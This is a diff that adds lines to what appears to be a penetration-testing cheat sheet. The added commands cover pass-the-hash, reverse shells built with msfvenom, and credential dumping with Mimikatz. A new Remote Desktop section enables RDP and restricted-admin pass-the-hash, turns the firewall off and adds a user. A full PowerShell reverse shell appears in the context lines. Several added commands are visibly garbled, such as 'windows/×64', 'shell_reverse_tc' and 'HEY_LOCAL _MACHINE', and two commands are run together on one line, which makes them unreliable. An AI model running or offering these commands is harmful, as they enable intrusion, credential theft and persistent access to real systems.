@@ -198,6 +198,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Active Directory Authentication Attacks](#active-directory-authentication-attacks)
     - [Lateral Movement Techniques](#lateral-movement-techniques)
     - [Active Directory Persistence](#active-directory-persistence)
+    - [Remote Desktop](#remote-desktop)
 - [Mobile](#mobile)
   - [Missing Certificate and Public Key Pinning](#missing-certificate-and-public-key-pinning)
   - [Cordova attacks](#cordova-attacks)
@@ -396,6 +397,7 @@ See [The Bug Hunter's Methodology v4.0 - Recon Edition by @jhaddix #NahamCon2020
 
 - Password attack: test the credentials found to gain more accesses
   - `crackmapexec <service> <IP> -u usernames.txt -p passwords.txt --continue-on-success`
+  - `crackmapexec <service> <IP> -u administrator -H <NTLM> --continue-on-success`
 - Explore the services found
   - Example: enumerate SMB shares with `crackmapexec smb <IP> -u <user> -p <password> --shares`
 - Client-side attack
@@ -4202,7 +4204,16 @@ Check also:
 
   $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
   ```
-	
+
+Other shells with msfvenom
+- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8444 EXITFUNC=thread -f exe -o shell.exe`
+- `msfvenom -p windows/×64/shell_reverse_tcp LHOST=<IP> LPORT=445 -f exe -e 64/xor -o shell.exe`
+- `msfvenom -f psh-cmd -p windows/shell_reverse_tc LHOST=tun0 LPORT=8443 -o rev.ps1`
+- `msfvenom -f ps1 -p windows/shell_reverse_tcp LHOST=tun0 LPORT=8443 -o rev.ps1`
+- `msfvenom -p windows/shell_reverse_tcp --list formats`
+- `msfvenom -p windows/shell_reverse_tcp --list-options`
+
+ 
 #### <ins>Kernel Exploits</ins>
 
 1. Save the output of the `systeminfo` command: `systeminfo > systeminfo.txt`
@@ -4769,6 +4780,8 @@ Domain Shares Enumeration
 -------------------------
 Find-DomainShare                                                                                                                          Find Domain Shares
 ```
+- See also [PowerView-3.0-tricks.ps1](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+
 
 #### <ins>PsLoggedOn</ins>
 
@@ -4822,7 +4835,8 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory <DIR> -OutputPrefix "co
   - `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p` to display all active sessions
 
 #### <ins>Mimikatz</ins>
-After starting `mimikatz.exe`, run the command `privilege::debug` to enable `SeDebugPrivilege`
+
+After starting `mimikatz.exe`, run the command `privilege::debug` to enable `SeDebugPrivilege` and run `token::elevate`
 ```
 sekurlsa::logonpasswords                                                           Dump the credentials of all logged-on users
 sekurlsa::tickets                                                                  Tickets stored in memory
@@ -4831,6 +4845,13 @@ crypto::cng                                                                     
 lsadump::dcsync /user:<domain>\<user>                                              Domain Controller Synchronization
 sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell       Overpass the Hash
 ```
+
+Other commands to run
+- `log`
+- `lsadump::sam`
+- `lsadump::secrets`
+- `lsadump::cache`
+
 
 #### <ins>Active Directory Authentication Attacks</ins>
 
@@ -4992,6 +5013,20 @@ Requirements
 3. `reg.exe save hklm\system c:\system.bak` save the SYSTEM hive from the Windows registry
 4. `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL` extract the credential materials
 
+
+#### <ins>Remote Desktop</ins>
+```
+# enable RDP
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
+# enable RDP pass the hash
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" PropertyType DWORD -Force
+
+# enable RDP and add user
+reg add "HEY_LOCAL _MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" / fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add HKLM\System \CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f netsh advfirewall set allprofiles state off
+net localgroup "remote desktop users" <USER. NAME> / add
+```
 
 
 ## Mobile
